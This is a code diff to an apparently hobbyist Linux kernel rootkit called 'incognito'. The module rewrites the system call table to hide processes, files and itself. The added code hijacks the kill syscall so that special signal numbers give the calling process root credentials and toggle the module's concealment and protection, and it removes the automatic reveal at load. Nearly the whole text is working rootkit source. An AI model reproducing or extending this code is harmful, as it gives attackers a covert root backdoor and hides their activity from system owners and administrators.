@@ -55,9 +55,18 @@ void incognito_exit(void);
 #endif
 
 //for hiding pids and files/directories
-const char * const HIDE_PS[] = {"bash", "ps"};
+const char * const HIDE_PS[] = {"ps", "bash"};
 const char * const HIDE_FILES[] = {"hidetarget.txt", "config.h", "incognito.c", "README.md", "Makefile"};
 #define INVISIBLE 0x10000000
+#define INCOGNITO_PREFIX "incognito_secret"
+
+//kill command signals
+enum {
+    SIGHIDE = 31,
+    //SIGPROTECT = 32,
+    SIGROOT = 64,
+    SIGMODHIDE = 63,
+};
 
 //linux_dirent struct
 //https://www.systutorials.com/docs/linux/man/2-getdents/
@@ -86,6 +95,7 @@ asmlinkage long (*originalRead)(unsigned int fd, char *buf, size_t count);
 asmlinkage long (*originalOpen)(const char __user *filename, int flags, umode_t mode);
 asmlinkage long (*originalLstat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 asmlinkage long (*originalStat)(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+asmlinkage long (*originalKill)(pid_t pid, int sig);
 
 //------------------------------Hijacked call list------------------------------
 asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
@@ -93,6 +103,7 @@ asmlinkage long hijackedRead(unsigned int fd, char *buf, size_t count);
 asmlinkage long hijackedOpen(const char __user *filename, int flags, umode_t mode);
 asmlinkage long hijackedLstat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
 asmlinkage long hijackedStat(const char __user *filename, struct __old_kernel_stat __user *statbuf);
+asmlinkage long hijackedKill(pid_t pid, int sig);
 
 static int page_read_write(ulong address)
 {
@@ -193,7 +204,7 @@ void root(void){
 	//printk(KERN_INFO "changing %d - %s ; uid %d\n",task->pid,task->comm,task->real_cred->uid.val);
 	creds->uid.val = 0;
 	creds->euid.val = 0;
-  creds->gid.val = 0;
+    creds->gid.val = 0;
 	creds->egid.val = 0;
 	//FYI THESE WILL CRASH LINUX
 	//creds->suid.val = 0;
@@ -265,7 +276,7 @@ long hideProcess(struct linux_dirent *dirp, long getdents){
                 //switch case to make sure we don't mess up in any spot
                 //check the error
                 if (offsetError < 0) {
-                        goto next;
+                        //goto next;
                 }
                 //get pid
                 pid = find_get_pid(pidNumber);
@@ -334,6 +345,36 @@ asmlinkage long hijackedGetdents(unsigned int fd, struct linux_dirent *dirp, uns
         return 0;
 }
 //-----------------------------END GETDENTS------------------------------------
+//-----------------------------KILL HIJACK------------------------------------
+asmlinkage long hijackedKill(pid_t pid, int signal){
+    //hijack the kill command for our input
+    //task for pid nonsense
+    //struct task_struct *task;
+    switch (signal) {
+        case SIGHIDE:
+        //hide the process
+            break;
+        case SIGROOT:
+        //grant the process root
+            root();
+            break;
+        case SIGMODHIDE:
+        //hide and protect the module
+            if (hidden){
+                reveal();
+                unprotect();
+            } else {
+                hide();
+                protect();
+            }
+            break;
+        default:
+            return originalKill(pid, signal);
+    }
+    return 0;
+}
+//-----------------------------END KILL HIJACK------------------------------
+
 int __init incognito_init(void) {
   //find system call table address
 	sys_call_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
@@ -346,24 +387,26 @@ int __init incognito_init(void) {
 		printk(KERN_INFO "Sys call table address : %p\n", sys_call_table);
 	}
 
-	//Hides the module
-	hide();
+	//Start hidden and protected module
+	//hide();
+    //protect();
 
 	//System Calls
 	page_read_write((ulong)sys_call_table);
 	//HOOK(sys_call_table, originalOpen, hijackedOpen, __NR_open);
 	//HOOK(sys_call_table, originalLstat, hijackedLstat, __NR_lstat);
 	//HOOK(sys_call_table, originalStat, hijackedStat, __NR_stat);
-        //hook getdents
-        HOOK(sys_call_table, originalGetdents, hijackedGetdents, __NR_getdents);
-
+    //hook getdents
+    HOOK(sys_call_table, originalGetdents, hijackedGetdents, __NR_getdents);
+    HOOK(sys_call_table, originalKill, hijackedKill, __NR_kill);
 	page_read_only((ulong)sys_call_table);
 	//Debug Print
     printk("incognito: module loaded\n");
 
 	//we immediately reveal since we have no way to enter commands yet!
 	//if you remove this atm you won't be able to find incognito >:)
-	reveal();
+	//reveal();
+    //unprotect();
 
   return 0;
 }
@@ -377,7 +420,7 @@ void __exit incognito_exit(void) {
 	//UNHOOK(sys_call_table, originalStat, __NR_stat);
     //Unhook getdents last (this unhides processes)
     UNHOOK(sys_call_table, originalGetdents, __NR_getdents);
-
+    UNHOOK(sys_call_table, originalKill, __NR_kill);
 	page_read_only((ulong)sys_call_table);
 
 
